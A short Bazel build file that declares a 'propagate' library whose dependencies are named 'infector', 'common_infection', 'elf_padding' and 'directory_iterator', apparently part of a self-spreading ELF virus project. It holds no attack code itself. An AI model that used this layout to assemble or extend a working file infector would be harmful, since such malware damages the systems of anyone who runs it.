load("//nostdlib:nostdlib.bzl", "cc_nostdlib_library")

package(default_visibility = ["//visibility:public"])

cc_nostdlib_library(
    name = "propagate",
    hdrs = ["propagate.hh"],
    deps = [
        "//common:directory_iterator",
        "//common:get_symbol_addr",
        "//infector:common_infection",
        "//nostdlib/sys:wait",
        "//signature:elf_padding",
    ],
)
